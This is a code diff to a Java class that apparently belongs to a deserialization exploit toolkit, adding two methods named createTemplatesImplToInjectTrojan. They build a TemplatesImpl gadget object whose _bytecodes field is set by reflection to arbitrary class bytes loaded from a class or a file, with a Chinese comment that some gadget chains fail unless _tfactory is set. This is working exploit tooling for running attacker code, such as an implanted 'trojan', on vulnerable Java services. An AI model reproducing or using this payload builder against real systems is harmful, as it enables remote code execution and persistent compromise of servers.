@@ -29,4 +29,24 @@ public class CreateTemplatesImpl {
         byte[] bytes = clazzEvil.toBytecode();
         return bytes;
     }
+
+    public static TemplatesImpl createTemplatesImplToInjectTrojan(Class clazz) throws Exception{
+        byte[] bytes = ClassFiles.classAsBytes(clazz);
+        TemplatesImpl templates = new TemplatesImpl();
+        Reflect.reflectSetField(templates,"_name","ky0117");
+        Reflect.reflectSetField(templates,"_bytecodes",new byte[][]{bytes});
+        // 兼容性问题,不加这个有些链会报错!
+        Reflect.reflectSetField(templates,"_tfactory",new TransformerFactoryImpl());
+        return templates;
+    }
+
+    public static TemplatesImpl createTemplatesImplToInjectTrojan(String fileName) throws Exception{
+        byte[] bytes = ClassFiles.fileAsBytes(fileName);
+        TemplatesImpl templates = new TemplatesImpl();
+        Reflect.reflectSetField(templates,"_name","ky0117");
+        Reflect.reflectSetField(templates,"_bytecodes",new byte[][]{bytes});
+        // 兼容性问题,不加这个有些链会报错!
+        Reflect.reflectSetField(templates,"_tfactory",new TransformerFactoryImpl());
+        return templates;
+    }
 }
